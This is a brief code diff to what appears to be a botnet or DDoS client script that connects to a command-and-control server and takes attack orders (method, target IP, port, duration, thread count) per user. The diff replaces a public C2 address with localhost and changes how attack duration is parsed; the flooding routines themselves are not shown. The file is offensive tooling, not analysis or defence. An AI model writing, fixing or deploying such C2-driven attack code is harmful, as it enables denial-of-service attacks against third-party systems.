@@ -1,8 +1,8 @@
 import subprocess, random, os, time, threading, socket
 
 # Configuration
-C2_ADDRESS  = "147.185.221.28"
-C2_PORT     = 35877
+C2_ADDRESS  = "127.0.0.1"
+C2_PORT     = 1337
 
 # Attack list
 user_attacks = {}
@@ -395,7 +395,7 @@ def main():
                 method = command
                 ip = args[1]
                 port = int(args[2])
-                secs = time.time() + int(args[3])
+                secs = int(args[3])
                 threads = int(args[4])
                 username = args[5] if len(args) >= 6 else "default"
 
